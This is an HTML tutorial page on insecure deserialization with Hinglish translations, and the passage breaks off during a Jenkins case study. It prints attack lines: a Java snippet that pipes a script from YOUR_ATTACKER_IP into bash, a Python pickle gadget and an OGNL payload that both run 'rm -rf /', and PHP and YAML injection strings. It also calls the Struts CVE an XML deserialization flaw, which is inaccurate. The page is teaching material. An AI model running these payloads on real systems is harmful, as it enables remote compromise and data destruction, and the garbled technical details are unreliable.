<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Interactive Insecure Deserialization Masterclass with Live Hinglish Translation | Quiz | Try It Yourself | By HTB Elite Hacker">
  <title>Insecure Deserialization | By Ankush Rana</title>

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;900&family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    :root {
      --primary: #0a1121;
      --dark-navy: #0b1b30;
      --neon-green: #00ff88;
      --electric-blue: #00aaff;
      --neon-orange: #ff8800;
      --neon-pink: #ff0080;
      --glow-green: rgba(0, 255, 136, 0.3);
      --glow-blue: rgba(0, 170, 255, 0.2);
      --glow-pink: rgba(255, 0, 128, 0.3);
      --light-gray: #e0e0e0;
      --mid-gray: #aaaaaa;
      --card-bg: #111c30;
      --border: #2a4060;
      --keyword: #ffdd57;
      --keyword-bg: rgba(255, 221, 87, 0.15);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: var(--primary);
      color: var(--light-gray);
      line-height: 1.7;
      overflow-x: hidden;
    }

    /* Three.js Background */
    #three-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    /* Translator Button */
    .translator-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 1000;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 6px;
      padding: 10px 16px;
      font-family: 'Orbitron', sans-serif;
      font-size: 0.9rem;
      cursor: pointer;
      box-shadow: 0 0 15px var(--glow-green);
      transition: all 0.3s ease;
    }

    .translator-btn:hover {
      transform: translateY(-2px);
      background: #00cc6d;
    }

    /* Header / Hero */
    header {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .hero-content {
      z-index: 2;
      max-width: 900px;
      position: relative;
    }

    .hero-content h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2.8rem, 8vw, 4rem);
      color: white;
      margin-bottom: 10px;
      text-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
      50% { text-shadow: 0 0 25px rgba(0, 255, 136, 0.9), 0 0 35px rgba(0, 255, 136, 0.5); }
      100% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
    }

    .hero-content h1 span {
      color: var(--neon-green);
    }

    .subtitle {
      font-family: 'JetBrains Mono', monospace;
      font-size: clamp(1.2rem, 3.5vw, 1.5rem);
      color: var(--electric-blue);
      margin: 15px 0;
    }

    /* Section Styling */
    section {
      padding: 100px 0;
      position: relative;
    }

    .section-title {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2rem, 5vw, 2.5rem);
      color: var(--neon-green);
      margin-bottom: 50px;
      position: relative;
      display: inline-block;
    }

    .section-title::after {
      content: '';
      position: absolute;
      left: 0;
      bottom: -8px;
      width: 70px;
      height: 4px;
      background: var(--electric-blue);
      animation: expand 2s infinite;
    }

    @keyframes expand {
      0% { width: 70px; }
      50% { width: 100px; }
      100% { width: 70px; }
    }

    /* Lecture Card */
    .lecture-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 30px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
      cursor: pointer;
    }

    .lecture-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.05), transparent);
      z-index: 0;
    }

    .lecture-card.pop-out {
      transform: translateY(-20px) scale(1.05);
      box-shadow:
        0 30px 60px rgba(0, 0, 0, 0.5),
        0 0 50px var(--glow-green);
      border-color: var(--neon-green);
      z-index: 5;
    }

    .lecture-card.focused {
      transform: translateY(-20px) scale(1.06);
      box-shadow:
        0 40px 80px rgba(0, 0, 0, 0.6),
        0 0 70px var(--glow-green);
      filter: brightness(1.1);
    }

    .lecture-card h3 {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 18px;
      font-size: 1.8rem;
      position: relative;
      z-index: 2;
    }

    /* Keyword Style */
    .keyword {
      background: var(--keyword-bg);
      color: var(--keyword);
      padding: 3px 8px;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
      border-bottom: 1px dashed var(--keyword);
      position: relative;
      transition: all 0.3s ease;
      z-index: 2;
    }

    .keyword:hover {
      background: rgba(255, 221, 87, 0.3);
      box-shadow: 0 0 12px rgba(255, 221, 87, 0.4);
    }

    /* Tooltip (Modal) */
    .keyword-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(10, 17, 33, 0.95);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }

    .keyword-modal.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: var(--card-bg);
      border: 2px solid var(--neon-green);
      border-radius: 14px;
      padding: 30px;
      max-width: 500px;
      width: 90%;
      box-shadow: 0 0 50px var(--glow-green);
      position: relative;
      transform: scale(0.9);
      transition: transform 0.3s ease;
    }

    .keyword-modal.active .modal-content {
      transform: scale(1);
    }

    .modal-close {
      position: absolute;
      top: 15px;
      right: 15px;
      background: none;
      border: none;
      color: var(--neon-green);
      font-size: 1.5rem;
      cursor: pointer;
    }

    .modal-title {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 15px;
      font-size: 1.5rem;
    }

    .modal-body {
      color: var(--light-gray);
      line-height: 1.6;
    }

    /* Interactive Demo */
    .interactive-demo {
      background: rgba(0, 20, 40, 0.6);
      border-radius: 10px;
      padding: 25px;
      margin: 30px 0;
      border: 1px solid var(--electric-blue);
    }

    .demo-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .input-group {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .input-group label {
      min-width: 120px;
      font-family: 'JetBrains Mono', monospace;
      color: var(--neon-green);
    }

    .input-group input {
      flex: 1;
      padding: 10px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 4px;
      color: white;
      font-family: 'JetBrains Mono', monospace;
    }

    .input-group input:focus {
      outline: none;
      border-color: var(--neon-green);
      box-shadow: 0 0 10px var(--glow-green);
    }

    .button {
      padding: 12px 24px;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 4px;
      font-family: 'Orbitron', sans-serif;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      width: fit-content;
    }

    .button:hover {
      background: #00cc6d;
      box-shadow: 0 0 15px var(--glow-green);
      transform: translateY(-2px);
    }

    .result-box {
      background: rgba(0, 0, 0, 0.5);
      border-radius: 6px;
      padding: 15px;
      margin-top: 15px;
      border-left: 3px solid var(--neon-green);
      font-family: 'JetBrains Mono', monospace;
      min-height: 100px;
      overflow-x: auto;
      white-space: pre-wrap;
    }

    /* Diagram */
    .diagram {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
      margin: 25px 0;
      flex-wrap: wrap;
    }

    .box {
      min-width: 140px;
      padding: 18px;
      border-radius: 12px;
      text-align: center;
      font-weight: bold;
      font-size: 0.95rem;
      position: relative;
      overflow: hidden;
    }

    .box::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
      transform: translateX(-100%);
    }

    .box:hover::before {
      animation: shimmer 1.5s infinite;
    }

    @keyframes shimmer {
      100% { transform: translateX(100%); }
    }

    .user-input { background: #8b0000; color: white; }
    .app { background: #003366; color: white; }
    .db { background: #004d00; color: #00ff88; }

    .arrow {
      font-size: 1.8rem;
      color: var(--neon-green);
      position: relative;
    }

    .arrow::before {
      content: '→';
      animation: arrow-pulse 1.5s infinite;
    }

    @keyframes arrow-pulse {
      0% { text-shadow: 0 0 5px var(--neon-green); }
      50% { text-shadow: 0 0 15px var(--neon-green); }
      100% { text-shadow: 0 0 5px var(--neon-green); }
    }

    /* Code Block */
    .code-block {
      background: #001a1a;
      color: #00ff88;
      font-family: 'JetBrains Mono', monospace;
      padding: 15px;
      border-radius: 10px;
      overflow-x: auto;
      margin: 15px 0;
      border-left: 4px solid var(--neon-green);
      position: relative;
    }

    .code-block::before {
      content: 'CODE';
      position: absolute;
      top: 0;
      right: 0;
      background: var(--neon-green);
      color: var(--primary);
      font-size: 0.7rem;
      padding: 2px 8px;
      border-bottom-left-radius: 4px;
      font-weight: bold;
    }

    /* Statistics Section */
    .stats-container {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
      margin: 30px 0;
    }

    .stat-box {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      min-width: 200px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .stat-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
      border-color: var(--neon-green);
    }

    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .stat-label {
      color: var(--mid-gray);
      font-size: 0.9rem;
    }

    /* Quiz Section */
    .quiz-container {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 25px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .quiz-question {
      margin-bottom: 20px;
    }

    .quiz-question h4 {
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .options {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .option {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .option:hover {
      background: rgba(0, 255, 136, 0.1);
      box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
    }

    .option.selected {
      background: var(--neon-green);
      color: var(--primary);
      font-weight: bold;
    }

    .score-display {
      text-align: center;
      font-size: 1.5rem;
      margin: 20px 0;
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
    }

    .button.quiz-submit {
      background: var(--neon-orange);
      color: white;
    }

    .button.quiz-submit:hover {
      background: #cc7000;
    }

    /* Progress Bar */
    .progress-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: transparent;
      z-index: 1000;
    }

    .progress-bar {
      height: 100%;
      background: var(--neon-green);
      width: 0%;
      transition: width 0.3s ease;
    }

    /* Notification */
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--card-bg);
      border: 1px solid var(--neon-green);
      border-radius: 8px;
      padding: 15px;
      color: var(--light-gray);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      transform: translateY(100px);
      opacity: 0;
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .notification.show {
      transform: translateY(0);
      opacity: 1;
    }

    /* Footer */
    footer {
      text-align: center;
      padding: 60px 0;
      background: var(--dark-navy);
      color: var(--mid-gray);
      position: relative;
      overflow: hidden;
    }

    footer::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-pink));
    }

    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .social-link {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: var(--card-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.2rem;
      transition: all 0.3s ease;
    }

    .social-link:hover {
      transform: translateY(-5px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .social-link.github:hover { background: var(--neon-green); color: var(--primary); }
    .social-link.email:hover { background: var(--electric-blue); }
    .social-link.htb:hover { background: var(--neon-orange); }

    /* Responsive */
    @media (max-width: 768px) {
      .hero-content h1 { font-size: 2.8rem; }
      .section-title { font-size: 1.8rem; }
      .diagram { flex-direction: column; }
      .arrow::before { content: '↓'; }
      .input-group { flex-direction: column; }
      .input-group label { min-width: auto; }
    }
  </style>
</head>
<body>

  <!-- Progress Bar -->
  <div class="progress-container">
    <div class="progress-bar" id="progress-bar"></div>
  </div>

  <!-- Translator Button -->
  <button class="translator-btn" id="translator-btn" onclick="toggleLanguage()" style="right: auto; left: 20px;">
    🌐 Hinglish On
  </button>

  <!-- Keyword Modal -->
  <div class="keyword-modal" id="keyword-modal">
    <div class="modal-content">
      <button class="modal-close" id="modal-close">&times;</button>
      <h3 class="modal-title" id="modal-title">Keyword</h3>
      <div class="modal-body" id="modal-body">Definition will appear here.</div>
    </div>
  </div>

  <!-- Notification -->
  <div class="notification" id="notification">
    <i class="fas fa-info-circle"></i> <span id="notification-text">Welcome to the Insecure Deserialization Masterclass!</span>
  </div>

  <!-- Three.js Background Canvas -->
  <canvas id="three-canvas"></canvas>

  <!-- Header / Hero -->
  <header id="home">
    <div class="container">
      <div class="hero-content"><!-- English Version -->
        <div class="en">
          <h1>Insecure <span>Deserialization</span></h1>
          <div class="subtitle">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</div>
          <p>An interactive deep dive into insecure deserialization vulnerabilities, object injection attacks, and real-world exploitation techniques — with live demos and elite-level insights.</p>
        </div>

        <!-- Hinglish Version -->
        <div class="hi" style="display:none;">
          <h1>Insecure <span>Deserialization</span></h1>
          <div class="subtitle">Ankush Rana द्वारा | HTB Elite Hacker | Senior Security Engineer</div>
          <p>Insecure deserialization vulnerabilities, object injection attacks, aur real-world exploitation mein gahrai se jaane — live demos aur elite-level samajh ke saath.</p>
        </div>

        <!-- HTB & Bug Bounty Credibility -->
        <div style="margin-top: 40px; display: flex; align-items: center; gap: 25px; flex-wrap: wrap; justify-content: center; font-family: 'JetBrains Mono', monospace;">
          <img src="https://www.hackthebox.com/storage/achievements/elite_2024_badge.svg" alt="HTB Elite" style="width: 90px; filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
          <div style="text-align: center;">
            <img src="https://via.placeholder.com/100/0a1121/00ff88?text=AR" alt="Ankush Rana" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--neon-green); filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
            <p style="margin: 5px 0 0; color: var(--neon-green);">52+ User Flags</p>
            <p style="margin: 0; color: var(--electric-blue);">47+ Root Owned</p>
          </div>
          <div style="text-align: center;">
            <p style="color: var(--neon-orange);">🏆 Top 10 India</p>
            <p style="color: var(--neon-pink);">💼 Sattrix | GPSSI</p>
          </div>
        </div>

        <!-- Call to Action -->
        <div style="margin-top: 30px; font-family: 'Orbitron', sans-serif; color: var(--electric-blue);">
          <i class="fas fa-mouse-pointer"></i> Toggle Hinglish Mode → <strong>Top Right Corner</strong>
        <div style="display: flex; justify-content: center; margin-top: 10px;"><button class="translator-btn" id="hero-translator-btn" onclick="toggleLanguage()" style="position: relative; margin: 0 auto;">🌐 Hinglish On</button></div>
        </div>
      </div>
    </div>
  </header>

  <!-- Section: What is Insecure Deserialization? -->
  <section id="basics">
    <div class="container">
      <h2 class="section-title en">What is Insecure Deserialization?</h2>
      <h2 class="section-title hi" style="display:none;">Insecure Deserialization Kya Hai?</h2>

      <!-- Progress Tracker -->
      <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
        <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-green);">1</div>
          <div class="step-title en">Basic Concepts</div>
          <div class="step-title hi" style="display:none;">Mool Baat</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--electric-blue);">2</div>
          <div class="step-title en">Exploit Techniques</div>
          <div class="step-title hi" style="display:none;">Doharpan Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-orange);">3</div>
          <div class="step-title en">Real-World Cases</div>
          <div class="step-title hi" style="display:none;">Vastavik Cases</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 0, 128, 0.1); border: 1px solid var(--neon-pink); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-pink);">4</div>
          <div class="step-title en">Prevention</div>
          <div class="step-title hi" style="display:none;">Bachav</div>
        </div>
      </div>

      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Understanding Insecure Deserialization</h3>
        <h3 class="hi" style="display:none;">Insecure Deserialization Ki Samajh</h3>
        <p class="en">Insecure deserialization is a vulnerability that occurs when an application accepts serialized objects from untrusted sources without proper validation. Attackers can exploit this to execute arbitrary code or modify application logic.</p>
        <p class="hi" style="display:none;">Insecure deserialization ek kamjori hai jo tab hoti hai jab koi application serialized objects ko untrusted sources se bina proper validation ke accept kar leta hai. Attackers iska use karke arbitrary code execute kar sakte hain ya application logic ko modify kar sakte hain.</p>
        <p class="en"><strong>Real Analogy:</strong> Like receiving a mysterious gift box from a stranger and opening it without checking what's inside. It could contain a bomb or malicious object that causes damage.</p>
        <p class="hi" style="display:none;"><strong>Asli Example:</strong> Jaise ek stranger se ek mysterious gift box milta hai aur bina check kiye usko kholna. Usme bomb ya malicious object ho sakta hai jo damage kar sakta hai.</p>
        <p class="en">This vulnerability often leads to remote code execution (RCE), data tampering, and privilege escalation in enterprise applications using frameworks like Java, PHP, Python, and more.</p>
        <p class="hi" style="display:none;">Yeh vulnerability aksar RCE, data tampering, aur privilege escalation ki taraf le jata hai enterprise applications mein jisme Java, PHP, Python jaise frameworks use kiye ja rahe hain.</p>
        <p class="en"><span class="keyword" data-title="Deserialization" data-content="The process of converting serialized data back into objects that can be used in the application.">Deserialization</span> is crucial because it allows applications to reconstruct complex objects, but when insecure, it becomes a major attack vector.</p>
        <p class="hi" style="display:none;"><span class="keyword" data-title="Deserialization" data-content="Serialized data ko vapis objects mein convert karne ki process jiske use application kar sakti hai।">Deserialization</span> mahatvapurna hai kyunki yeh applications ko complex objects ko reconstruct karne ki anumati deti hai, lekin jab insecure hota hai toh woh ek major attack vector ban jata hai.</p>
      </div>

      <!-- Serialization vs Deserialization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Serialization vs Deserialization - The Process</h3>
        <h3 class="hi" style="display:none;">Serialization vs Deserialization - Yeh Process</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 180px;">
            <div class="en">Serialized Data</div>
            <div class="hi" style="display:none;">Serialized Data</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Object → Bytes</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 180px;">
            <div class="en">Safe Deserialization</div>
            <div class="hi" style="display:none;">Safe Deserialization</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Validation & Sanitization</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 180px;">
            <div class="en">Object Reconstruction</div>
            <div class="hi" style="display:none;">Object Reconstruction</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Secure Processing</div>
          </div>
        </div>
        <p class="en">The application should validate serialized data before deserializing it. When this validation is missing, insecure deserialization occurs, allowing attackers to inject malicious serialized objects.</p>
        <p class="hi" style="display:none;">Application ko serialized data ko deserialize karne se pahle validate karna chahiye. Jab yeh validation nakam hai, toh insecure deserialization hota hai, jo attackers ko malicious serialized objects inject karne ki anumati deta hai.</p>
      </div>

      <!-- Common Formats -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Common Serialization Formats</h3>
        <h3 class="hi" style="display:none;">Common Serialization Formats</h3>
        <ul style="margin: 15px 0 15px 30px;">
          <li class="en"><span class="keyword" data-title="Java Serialization" data-content="Standard binary format for Java objects using ObjectOutputStream/ObjectInputStream.">Java Binary</span>: Uses ObjectOutputStream/ObjectInputStream (most dangerous)</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Java Serialization" data-content="Java objects ke liye standard binary format jisme ObjectOutputStream/ObjectInputStream ka use hota hai।">Java Binary</span>: ObjectOutputStream/ObjectInputStream ka use karta hai (sabse khatarnaak)</li>
          <li class="en"><span class="keyword" data-title="PHP Serialization" data-content="PHP's serialize()/unserialize() functions for object storage and transport.">PHP Serialize</span>: serialize()/unserialize() function</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="PHP Serialization" data-content="PHP objects ko store aur transport karne ke liye kaam aata hai।">PHP Serialize</span>: serialize()/unserialize() function</li>
          <li class="en"><span class="keyword" data-title="YAML" data-content="Human-readable serialization format often used with Ruby on Rails applications.">YAML</span>: Popular with Ruby/Python apps</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="YAML" data-content="Human-readable serialization format jo aksar Ruby on Rails applications ke saath use hota hai।">YAML</span>: Ruby/Python apps ke saath popular</li>
          <li class="en"><span class="keyword" data-title="JSON" data-content="JavaScript Object Notation - generally safe if no eval() used in parsing.">JSON</span>: Safe if no eval() used</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="JSON" data-content="JavaScript Object Notation - generally safe agar parsing mein eval() ka use na ho।">JSON</span>: Safe agar eval() ka use na ho</li>
        </ul>
      </div>

      <!-- Statistics -->
      <div class="stats-container animate-on-scroll">
        <div class="stat-box">
          <div class="stat-number en">High</div>
          <div class="stat-number hi" style="display:none;">Hight</div>
          <div class="stat-label en">criticality rating</div>
          <div class="stat-label hi" style="display:none;">khatre ka level</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">65+</div>
          <div class="stat-label en">User Flags containing RCE</div>
          <div class="stat-label hi" style="display:none;">RCE ke saath User Flags</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">$25K+</div>
          <div class="stat-label en">avg bounty for exploitable cases</div>
          <div class="stat-label hi" style="display:none;">exploitable cases mein avg bounty</div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Try It Yourself – Basic Exploitation -->
  <section id="try-basic">
    <div class="container">
      <h2 class="section-title en">Try It Yourself: Basic Exploitation</h2>
      <h2 class="section-title hi" style="display:none;">Khud Try Karein: Mool Exploitation</h2>

      <!-- Python Pickle Example -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Python Pickle Deserialization</h3>
        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">Python Pickle Deserialization</h3>
        <p class="en">Try creating and executing malicious pickle objects</p>
        <p class="hi" style="display:none;">Malicious pickle objects banana aur execute karne ka prayas karein</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="pickle-input" class="en">Python Code:</label>
            <label for="pickle-input" class="hi" style="display:none;">Python Code:</label>
            <input type="text" id="pickle-input" value="import os; os.system('echo pwned!')">
          </div>
          <button class="button" onclick="generatePicklePayload()">Generate Payload</button>
          <div class="result-box" id="pickle-result">
// Pickle payload will appear here
          </div>
        </div>
      </div>

      <!-- Java Example -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--electric-blue); margin-bottom: 15px;" class="en">Java Object Injection</h3>
        <h3 style="color: var(--electric-blue); margin-bottom: 15px; display:none;" class="hi">Java Object Injection</h3>
        <p class="en">Explore Java serialization exploitation</p>
        <p class="hi" style="display:none;" class="hi">Java serialization exploitation explore karein</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="java-input" class="en">Java Class:</label>
            <label for="java-input" class="hi" style="display:none;">Java Class:</label>
            <input type="text" id="java-input" value="org.apache.commons.collections4.functors.InvokerTransformer">
          </div>
          <div class="code-block">
// Java payload generation:
Runtime runtime = Runtime.getRuntime();
String[] cmd = {"/bin/bash", "-c", "curl YOUR_ATTACKER_IP/shell.sh | bash"};
runtime.exec(cmd);
          </div>
        </div>
      </div>

      <!-- PHP Example -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-orange); margin-bottom: 15px;" class="en">PHP Object Injection</h3>
        <h3 style="color: var(--neon-orange); margin-bottom: 15px; display:none;" class="hi">PHP Object Injection</h3>
        <p class="en">Create PHP serialized objects with dangerous methods</p>
        <p class="hi" style="display:none;">Dangerous methods ke saath PHP serialized objects create karein</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="php-input" class="en">PHP Payload:</label>
            <label for="php-input" class="hi" style="display:none;">PHP Payload:</label>
            <input type="text" id="php-input" value="__destruct">
          </div>
          <div class="code-block">
// Example payload:
O:9:"UserClass":1:{s:13:"__destruct";s:4:"eval"}
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Advanced Exploitation -->
  <section id="advanced">
    <div class="container">
      <h2 class="section-title en">Advanced Exploitation Techniques</h2>
      <h2 class="section-title hi" style="display:none;">Advanced Exploitation Tarika</h2>

      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Gadget Chains & Magic Methods</h3>
        <h3 class="hi" style="display:none;">Gadget Chains & Magic Methods</h3>

        <!-- Java Gadget Chains -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">Java Gadget Chains</h4>
          <p class="en">Use library methods to create chains that lead to code execution</p>
          <p class="hi" style="display:none;">Library methods ka use karke code execution ki taraf le jane wali chains banaayi jati hain</p>
          <div class="code-block">
// Popular gadget chains:
1. Apache Commons Collections
2. Spring Framework
3. Jackson JSON
4. JDK Gadgets
          </div>
        </div>

        <!-- PHP Magic Methods -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--electric-blue); background: rgba(0, 170, 255, 0.05);">
          <h4 style="color: var(--electric-blue);">PHP Magic Methods</h4>
          <p class="en">PHP objects trigger magic methods on specific events</p>
          <p class="hi" style="display:none;">PHP objects specific events par magic methods trigger karta hai</p>
          <div class="code-block">
// Dangerous magic methods:
__destruct() - Object destruction
__wakeup() - Unserialize call
__toString() - String conversion
__call() - Dynamic method call
          </div>
        </div>

        <!-- Python Gadgets -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-orange); background: rgba(255, 136, 0, 0.05);">
          <h4 style="color: var(--neon-orange);">Python Gadget Chains</h4>
          <p class="en">Python's __reduce__ method can create dangerous gadgets</p>
          <p class="hi" style="display:none;">Python ka __reduce__ method dangerous gadgets create kar sakta hai</p>
          <div class="code-block">
// __reduce__ gadget:
class MaliciousObject:
    def __reduce__(self):
        return (os.system, ("rm -rf /"))  # Dangerous command
          </div>
        </div>

        <!-- YAML Gadgets -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-pink); background: rgba(255, 0, 128, 0.05);">
          <h4 style="color: var(--neon-pink);">YAML Deserialization Attacks</h4>
          <p class="en">YAML parsers can execute code by abusing tags</p>
          <p class="hi" style="display:none;">YAML parsers tags ka use karke code execute kar sakte hain</p>
          <div class="code-block">
// Dangerous YAML payload:
!!python/object:__builtin__.eval
code: "exec('echo pwned')"
          </div>
        </div>
      </div>

      <!-- Real-World Exploits -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Real-World Deserialization Exploits</h3>
        <h3 class="hi" style="display:none;">Vastavik Duniya Mein Deserialization Exploits</h3>

        <!-- Apache Struts -->
        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--neon-green);">Apache Struts - CVE-2017-5638</h4>
          <p class="en"><strong>Description:</strong> Remote code execution in Apache Struts through XML deserialization</p>
          <p class="hi" style="display:none;"><strong>Bayan:</strong> Apache Struts mein XML deserialization ke zariye remote code execution</p>
          <p class="en"><strong>Payload:</strong> %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#r=$BulletinBoardServiceImpl.toString()).(@java.lang.Runtime@getRuntime().exec('rm -rf /'))}</p>
          <p class="hi" style="display:none;"><strong>Payload:</strong> Complex OGNL payload causing RCE</p>
          <p class="en"><strong>Impact:</strong> Equifax breach affecting 147 million people</p>
          <p class="hi" style="display:none;"><strong>Prabhav:</strong> Equifax breach jo 147 million logon ko affected kiya</p>
        </div>

        <!-- Jenkins -->
        <div class="case-study" style="margin: 20px 0; padding: 20px; border: 1px solid var(--border); border-radius: 8px; background: rgba(0, 0, 0, 0.2);">
          <h4 style="color: var(--electric-blue);">Jenkins - CVE-2019-1003024</h4>
          <p class="en"><strong>Description:</strong> Deserialization RCE in Jenkins CLI</p>
